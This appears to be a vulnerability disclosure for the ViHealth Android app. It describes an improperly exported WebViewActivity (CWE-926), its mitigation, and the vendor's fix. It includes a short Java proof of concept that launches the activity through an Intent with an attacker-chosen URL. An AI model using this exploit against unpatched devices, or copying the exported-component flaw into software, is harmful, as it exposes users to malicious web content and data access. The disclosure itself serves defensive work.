** RESERVED ** An issue in Viatom Health ViHealth for Android v.2.74.58 and before allows a remote attacker to execute arbitrary code via the com.viatom.baselib.mvvm.webWebViewActivity component.


Vendor of Product: Viatom Health     

Vulnerability Type: CWE-926: Improper Export of Android Application Components


Affected Product: ViHealth for Android v.2.74.58* & earlier (com.viatom.vihealth)

Affected Component: Exported Activity "com.viatom.baselib.mvvm.web.WebViewActivity"

Attack Type: Adjacent

The Android application contains an exported component that allows access by other applications without proper access control restrictions. 

This vulnerability could allow a 3rd party application installed on the device to launch the exported activity and access the data it contains.

A malicious app can load the URL of their choice to facilitate malicious actions.

See https://cwe.mitre.org/data/definitions/926.html

This issue can be mitigated by changing exported status of the activity reflected on the AndroidManifest.xml entry:

![image](https://github.com/actuator/cve/assets/78701239/84dae93b-0abe-469f-b936-f2d2cca61e9d)


An attacker could craft a 3rd party app using the following code to load the URL of their choice to facilitate malicious actions:



********************************************************************************************************************************

Intent launch = new Intent();
launch.setClassName("com.viatom.vihealth", "com.viatom.baselib.mvvm.web.WebViewActivity");

// Put the URL to be loaded in the WebViewActivity
launch.putExtra("web_url", "https://www.windows93.net");

// Start the activity
startActivity(launch);

********************************************************************************************************************************



![com viatom baselib mvvm web WebViewActivity](https://github.com/actuator/cve/assets/78701239/b4fe4884-58d3-4799-b2ab-26db8744309c)


![image](https://github.com/actuator/cve/assets/78701239/e37edb0d-94f4-487d-b547-f2ba4d6037ea)

**This issue has been fixed today (6/19/23) with version (2.74.62)-shortly after I reported it to the vendor on 6/10/23.




![image](https://github.com/actuator/cve/assets/78701239/4c2b98e8-2407-4325-bc96-8de0dae71443)


Discoverer: Edward Warren
